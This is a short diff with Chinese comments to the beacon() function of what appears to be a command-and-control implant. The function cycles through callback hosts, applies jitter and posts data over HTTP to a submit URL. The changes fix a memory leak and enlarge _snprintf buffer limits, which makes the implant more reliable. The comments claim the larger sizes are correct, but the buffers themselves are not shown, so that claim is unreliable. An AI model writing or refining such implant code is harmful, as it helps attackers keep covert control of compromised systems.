@@ -132,8 +132,11 @@ void beacon(LPVOID lpReserved) {
 	jitter = setting_short(SETTING_JITTER);
 
 	/* 分配缓冲区 */
-	buffer = (char *)malloc(MAX_GET); /* 这在process_payload中被清除 */
+	buffer = (char *)malloc(MAX_GET);
 	if (buffer == NULL) {
+		if (strategyInfo) {
+			free(strategyInfo);  // 添加：释放已分配的内存
+		}
 		safe_exit();
 	}
 	track_memory_add(buffer, MAX_GET, TRACK_MEMORY_MALLOC, FALSE, NULL);
@@ -146,13 +149,13 @@ void beacon(LPVOID lpReserved) {
 
 		_snprintf(beacon_domain, 128, "%s", next_host(hosts, failedHost, strategyInfo));
 		failedHost = FALSE;
-		_snprintf(url, 128, "%s", next_host(hosts, failedHost, strategyInfo));
+		_snprintf(url, 256, "%s", next_host(hosts, failedHost, strategyInfo));  // 修改：url缓冲区大小应该是256
 
 		/* 使用HTTP通信输出 */
 		post_type = POST_HTTP;
 
 		/* 创建URL */
-		_snprintf(post_url, 256, "%s", submit);
+		_snprintf(post_url, 1024, "%s", submit);  // 修改：使用完整的缓冲区大小
 
 		/* 执行协议的HTTP部分 */
 		// dlog("beacon.beacon - http_init: %s \n", beacon_domain);
